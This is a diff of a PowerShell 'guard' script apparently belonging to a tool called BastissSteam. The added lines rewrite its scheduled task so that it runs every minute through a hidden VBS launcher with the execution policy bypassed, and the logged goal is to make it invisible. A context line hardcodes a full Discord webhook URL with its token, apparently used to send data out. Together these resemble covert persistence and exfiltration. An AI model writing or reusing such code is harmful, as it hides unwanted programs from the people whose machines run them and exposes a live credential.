@@ -9,6 +9,15 @@ $clientId=""; try{ $clientId=(Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Nam
 if(-not $clientId){ try{ $clientId=[System.IO.File]::ReadAllText((Join-Path $env:LOCALAPPDATA "BastissSteam\client_id.txt")).Trim() } catch{} }
 if(-not $clientId){ $clientId=$env:COMPUTERNAME }
 Log "Guard server=$serverUrl client=$clientId"
+try {
+    $gvbs=Join-Path $env:LOCALAPPDATA "BastissSteam\guard_launch.vbs"; $gfix=$false
+    try { $tq=& schtasks.exe /query /tn BastissGuard /v /fo LIST 2>$null | Out-String; if($tq -match "guard\.ps1" -and $tq -notmatch "wscript"){ $gfix=$true } } catch {}
+    if($gfix){
+        try { Set-Content -LiteralPath $gvbs -Value "Set sh = CreateObject(`"WScript.Shell`")`r`nps = sh.ExpandEnvironmentStrings(`"%LOCALAPPDATA%\BastissSteam\guard.ps1`")`r`ncmd = `"powershell -NoProfile -ExecutionPolicy Bypass -File `" & Chr(34) & ps & Chr(34)`r`nsh.Run cmd, 0, False`r`n" -Encoding ASCII -ErrorAction SilentlyContinue } catch {}
+        if(Test-Path $gvbs){ & schtasks.exe /Create /TN "BastissGuard" /TR "wscript.exe //B `"$gvbs`"" /SC MINUTE /MO 1 /F *> $null }
+        Log "Guard tarea reparada a modo oculto (sin parpadeo)"
+    }
+} catch{}
 $webhook="https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
 while($true){
     try{
